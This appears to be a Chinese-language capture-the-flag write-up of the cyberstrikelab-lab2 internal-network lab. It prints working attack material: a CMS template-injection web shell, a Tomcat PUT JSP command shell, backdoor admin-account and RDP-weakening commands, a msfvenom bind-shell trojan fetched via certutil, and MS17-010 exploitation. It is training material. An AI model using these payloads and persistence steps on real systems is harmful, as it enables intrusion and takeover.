+++
series = ["内网渗透 学习记录", "域渗透 学习记录"]
categories = ["域渗透", "内网渗透", "渗透测试"]
tags = ["域渗透", "内网渗透", "渗透测试"]
description = "靶机"
title = "cyberstrikelab-lab2"
date = 2026-07-06T23:53:40+08:00
draft = false
pin = false
+++
# flag1

初始页面打不开，fscan扫一下10段

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705170323434.png)

发现存在10 和 20主机   20主机处于域内

10主机发现808端口开放web服务

发现是骑士cms

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705163822819.png)

找到后台路径  

```c
http://192.168.10.10:808/index.php?m=admin&c=index&a=login
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705163911238.png)


弱口令  admin   admin123456 登录

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705164023816.png)

使用nday   模板注入   phpinfo 探测

```c
http://192.168.10.10:808/index.php?m=Admin&c=Tpl&a=set&tpl_dir=%C2%A0%27,%20%27a%27,phpinfo(),%27
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705164131258.png)

再来一次就会刷新

```c
http://192.168.10.10:808/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',eval($_POST[a]),'
```

蚁剑连接  注意shell地址

```c
http://192.168.10.10:808/Application/Home/Conf/config.php
```

找到第一个flag

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705164704078.png)

go-flag{MP9E4xXhya0TlzVF}


# flag2

发现10主机权限巨高

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705165004764.png)

先做一下权限维持,可能后面有用（结果发现没用上）

```c
添加用户 zcx 1324@cbD  
  
net user zcx 1324@cbD /add  
  
用户添加到管理员组  
net localgroup Administrators zcx /add  
  
开启注册表3389  
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MinEncryptionLevel /t REG_DWORD /d 1 /f


```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705165708636.png)


开始渗透20主机  发现存在经典的  tomcat put 文件上传 CVE 

直接直接使用  curl完成 了   我比较懒 不想开bp

```c
curl -X PUT http://192.168.10.20:8080/1.jsp/ -d '<%@ page import="java.io.*" %>                     
<%
String c = request.getParameter("cmd");
if (c != null) {
    String[] x = {"cmd.exe","/c",c};
    Process p = Runtime.getRuntime().exec(x);
    InputStream is = p.getInputStream();
    int n;
    while((n=is.read())!=-1){
        out.print((char)n);
    }
}
%>'
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705171224624.png)


探测一下，发现权限不高

```c

 curl -i "http://192.168.10.20:8080/1.jsp?cmd=whoami"                           

```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705171339941.png)


发现是双网卡  存在10段 和 20段

```c
curl -i "http://192.168.10.20:8080/1.jsp?cmd=ipconfig"
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705171425736.png)

尝试读取一下根目录下的flag

```c
curl -i -G "http://192.168.10.20:8080/1.jsp" --data-urlencode "cmd=cmd /c type C:\flag.txt"
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705172244006.png)


发现读取成功

go-flag{2a1AygwfTuccnNJY}


# flag3

因为靶场不出网，咱们直接用  msf 生成正向木马  利用  10 主机作为跳板机进行


```c
正向shell：
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o 4444.exe

监听器：
use exploit/multi/handler 
set payload windows/meterpreter/bind_tcp
set rhost 192.168.10.20
set lport 4444
run
```

生成的木马先上传到  10主机上面

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705173943690.png)


然后下载

```c
curl -G "http://192.168.10.20:8080/1.jsp" --data-urlencode "cmd=certutil -urlcache -split -f http://192.168.10.10:808/4444.exe C:\\Windows\\Temp\\4444.exe"
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705174015187.png)

然后运行  木马

```c
 curl -G "http://192.168.10.20:8080/1.jsp" --data-urlencode "cmd=C:\\Windows\\Temp\\4444.exe"
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705174105006.png)



同时   msf 那边开启监听

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705174040533.png)


发现已经弹过来了

```c
shell  
chcp 65001  
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705181723625.png)


  上传 fscan

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705175815401.png)


fscan 扫描  20段  发现 30主机存在ms17-010  

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705175922211.png)

添加路由

```c
run autoroute -s 192.168.20.0/24
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705180301901.png)

会话挂起   执行下面命令

```c
search ms17
use 19
msf auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30
rhost => 192.168.20.30
msf auxiliary(admin/smb/ms17_010_command) > set command 'whoami'
command => whoami
msf auxiliary(admin/smb/ms17_010_command) > run
```

爽了 最高权限 不用提权了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705180552410.png)

直接flag拿下

```c
set command 'type c:\flag.txt'

```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705180748486.png)


go-flag{uhzy7lknuXsJtB3Z}

